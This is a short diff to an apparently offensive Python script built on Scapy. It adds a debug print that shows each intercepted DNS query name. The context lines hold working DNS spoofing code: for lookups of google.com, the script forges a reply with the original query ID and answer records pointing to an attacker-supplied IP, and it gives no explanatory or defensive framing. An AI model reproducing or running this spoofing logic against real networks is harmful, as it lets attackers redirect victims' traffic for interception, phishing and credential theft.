@@ -39,6 +39,7 @@ def dnsSpoofing(targetIP, spoofIP,sourceIP):
 
 def forwardDnsSpoofing(spooferIP):
     def forwardDNS(orgPacket: IP):
+        print(orgPacket[DNSQR].qname)
         if orgPacket[DNSQR].qname == b'google.com.':
             print('DNS Spoofing')
             spoofedPacket = IP(dst=orgPacket[IP].src, src=orgPacket[IP].dst) / UDP(dport=orgPacket[UDP].sport, sport=orgPacket[UDP].dport) / DNS(id=orgPacket[DNS].id, qr=1, qd=orgPacket[DNS].qd, an=DNSRR(rrname=orgPacket[DNSQR].qname, ttl=10, rdata=spooferIP) / DNSRR(rrname=orgPacket[DNSQR].qname, ttl=10, rdata=spooferIP))
